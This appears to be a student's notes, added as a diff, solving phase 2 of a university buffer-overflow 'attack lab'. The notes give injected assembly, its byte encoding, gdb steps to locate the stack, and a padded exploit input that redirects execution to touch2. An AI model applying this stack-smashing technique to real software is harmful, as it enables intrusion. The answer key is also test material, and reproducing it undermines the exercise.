@@ -1,0 +1,59 @@
+cookie.txt
+0x76ebdb56
+
+emacs phase2.s:
+movq $0x76ebdb56,%rdi 
+retq
+
+gcc -c phase2.s
+objdump -d phase2.o  > phase2.d 
+
+emacs phase2.d:
+phase2.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:   48 c7 c7 56 db eb 76    mov    $0x76ebdb56,%rdi
+   7:   c3                      retq
+
+- gdb ctarget
+- b getbuf
+- r
+- disas
+Dump of assembler code for function getbuf:
+=> 0x000000000040181b <+0>:	sub    $0x38,%rsp
+   0x000000000040181f <+4>:	mov    %rsp,%rdi
+   0x0000000000401822 <+7>:	callq  0x401a53 <Gets>
+   0x0000000000401827 <+12>:	mov    $0x1,%eax
+   0x000000000040182c <+17>:	add    $0x38,%rsp
+   0x0000000000401830 <+21>:	retq   
+End of assembler dump.
+- until *0x0000000000401827
+- type any string
+- x/s $rsp
+0x5561a088:	"ldsjfsdkfjdslfkjsdlkfjsdlkfjsldkfjsldkjf"
+
+byte representation: 
+48 c7 c7 56 db eb 76 c3
+address of $rsp: 
+0x5561a088 / 0x 55 61 a0 88
+address of touch2:
+40185d / 40 18 5d
+
+phase2.txt:
+48 c7 c7 56 db eb 76 c3 (cookie INCLUDED IN PADDING)
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+88 a0 61 55 00 00 00 00 (address of $rsp in little endian - NOT INCLUDED IN PADDING)
+5d 18 40 00 00 00 00 00 (address of touch2 in little endian - ALSO NOT INCLUDED IN PADDING)
+
+./hex2raw < phase2.txt > raw-phase2.txt
+./ctarget < raw-phase2.txt
+
+
